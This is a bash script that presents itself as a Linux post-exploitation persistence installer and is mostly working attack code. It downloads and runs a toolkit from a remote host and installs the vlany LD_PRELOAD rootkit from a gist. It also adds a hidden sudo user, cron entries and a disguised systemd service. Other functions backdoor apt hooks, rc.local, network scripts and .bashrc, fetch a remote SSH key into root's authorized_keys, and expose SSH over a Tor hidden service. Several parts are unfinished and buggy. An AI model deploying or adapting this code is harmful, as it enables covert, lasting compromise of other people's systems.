#!/usr/bin/env bash
#***********************************************************#
#           Author        - pyCity                          #
#           Date          - 2/2/2019                        #
#           Version       - 1.0                             #
#                                                           #
#           Usage         - Run ./installer with one arg    #
#                           which is the path to payload    #
#                           (e.g., ./installer /etc/s.elf)  #
#                                                           #
#           Description   - Linux post-exploitation         #
#                           persistence script              #
#                           (in progress)                   #
#***********************************************************#

# Make sure user is root
if [ "$EUID" -ne 0 ]; then
    echo "Need root, current id: $EUID"
    exit 1
fi

HIDDEN_DIR="/etc/.systemd/"               # Directory for binaries
PAYLOAD=$1                                # Full path to payload


#**************************************************************************#
#                       Functions                                          #
#                                                                          #
#   unpack_kit             - Create hidden directory and download          #
#                            toolkit. Unpack tk.tar.gz, test the payload   #
#                                                                          #
#   install_rootkit        - Download and install vlany                    #
#                            LD_Preload Rootkit (x86 and x86_64)           #
#                                                                          #
#   add_user               - Get username and password, create system      #
#                            level user with sudo privileges               #
#                                                                          #
#   add_cron               - add $PAYLOAD variable to crontab as           #
#                            @reboot sleep 100 && $PAYLOAD                 #
#                                                                          #
#   create_service         - Create a system service that restarts         #
#                            $PAYLOAD if it dies. Execute as root.         #
#                                                                          #
#   add_rclocal             - Still in progress. Check if our payload      #
#                            exists in the rc.local file, if not then      #
#                            append it to file                             #
#                                                                          #
#   tor_hidden_ssh         - Still working on this one. Plan is to         #
#                            download and install tor with an openssh-     #
#                            server for SSH over hidden service            #
#**************************************************************************#


function unpack_kit {
    # If hidden directory doesn't already exist, create it, grab
    # .tar.gz via wget, and untar + test payload

    if [ ! -f ${HIDDEN_DIR} ]; then
        mkdir ${HIDDEN_DIR} && cd ${HIDDEN_DIR}
        wget http://10.0.3.3/tk.tar.gz -P ${HIDDEN_DIR}
        tar -xzvf tk.tar.gz
        chmod +x ${PAYLOAD} && bash ${PAYLOAD}

        if [ $? -eq 0 ]; then
            echo Payload ran successfully. Killing process..
            PID=$(pidof $PAYLOAD)
            kill $PID
        else:
            echo Unable to run payload
    fi
fi
}



function install_rootkit {
    wget https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh -O /tmp/quick_install.sh &&
    chmod +x /tmp/quick_install.sh && /tmp/quick_install.sh
}



function add_user {
    echo "Adding a user..."
    read -p "Username: " USER
    read -s -p "Password: " PASSWD
    egrep "^$USER" /etc/passwd >/dev/null

    # Check that user exists before adding user
    if [ $? -eq 0 ]; then
        echo User already exists && exit 2
    else
        adduser --system --shell /bin/bash --no-create-home ${USER} && usermod -aG sudo ${USER}
        echo "$USER:$PASSWD" | chpasswd
        [ $? -eq 0 ] && echo "Sudo user ${USER} has been added" || echo "Failed to add sudo user"
fi
}



function add_cron {
    echo "Adding $PAYLOAD to cron..."
    if [ $(crontab -l | grep ${PAYLOAD} | wc -l) -eq 0 ]; then
        (crontab -l ; echo "@reboot sleep 200 && $PAYLOAD")|crontab 2> /dev/null && echo "${PAYLOAD} successfully added to crontab" || echo "Failed to update crontab"

        if [ $? -ne 0 ]; then
            echo "Trying again...."
            echo "@reboot sleep 200 && ${PAYLOAD}" | tee -a /var/spool/cron/root && echo "${PAYLOAD} successfully added to crontab" || echo "Failed to update cron"
    fi
fi
}



function create_service {
    touch /lib/systemd/system/systemd-Zero.service
    cd /lib/systemd/system/
    echo -e "[Unit]\nDescription=Systemd-Timer\nAfter=network.target\n\n[Service]\nType=simple\nUser=root\nExecStart=${PAYLOAD}\nRestart=on-failure\n\n[Install]\nWantedBy=default.target" > systemd-Zero.service
    systemctl daemon-reload && sleep 5
    systemctl enable systemd-Zero.service
    systemctl start systemd-Zero.service
}



#---------------------------All functions below this line are NOT finished--------------------------------


function add_rclocal {
    if [ "bash ${PAYLOAD} &" = "$(cat /etc/rc.local | grep ${PAYLOAD} | grep -v grep)" ]; then
        echo "Already exists"
    else
        echo "bash /root/.systemd/Zero &" >> /etc/rc.local
fi
}


function hidden_service {
    apt-get install git openssh-server tor python-pip -y
    echo "HiddenServiceDir /var/lib/tor/secret_service/; HiddenServicePort 22 127.0.0.1:22;" >> /etc/tor/torrc
    systemctl restart tor.service && systemctl enable tor.service
    URL=$(cat /var/lib/tor/secret_service/hostname)
    echo "$URL is your new client address."
}


function backdoor_startup_service {
    sed -i -e "4i\$PAYLOAD 2>dev/null" /etc/network/if-up.d/upstart
}


function backdoor_apt_update {
     echo 'APT::Update::Pre-Invoke {"bash' ${PAYLOAD}' 2>/dev/null &"};' > /etc/apt/apt.conf.d/42systemd

}


function add_sshkey {
    echo $(wget http://10.0.3.3/id_rsa.pub) >> /root/.ssh/authorized_keys
}


function backdoor_bashrc {
    if [ -f /root/.bashrc ]; then
        echo $(alias sudo="/usr/bin/sudo && bash ${PAYLOAD}") >> /root/.bashrc
        source ~/.bashrc
fi
}


# Must be 0755 - read, write, execute universally)
function symlink_sudo {
    if [ -f "/usr/bin/sudo" ]; then
        ln -s /usr/bin/sudo ${PAYLOAD}
fi
}




# If user enters 0 args, go ahead and install toolkit
if [ $# -eq 0 ];then
    echo "Select an option:"
    echo "1 to install rootkit"
    echo "2 to add sudo user"
    echo "3 to add payload to cron"
    echo "4 to add system service"
    echo "5 to unpack dropkit"
    echo "6 to exit"
    read answer
    if [ $answer -eq 1 ]; then
        install_rootkit
    elif [ $answer -eq 2 ]; then
        add_user
    elif [ $answer -eq 3 ]; then
        add_cron
    elif [ $answer -eq 4 ]; then
        create_service
    elif [ $answer -eq 5 ]; then
        unpack_kit
    elif [ $answer -eq 6 ]; then
        exit 1
    else
        echo "Not a valid number. Exiting."
        exit 1
    fi
fi
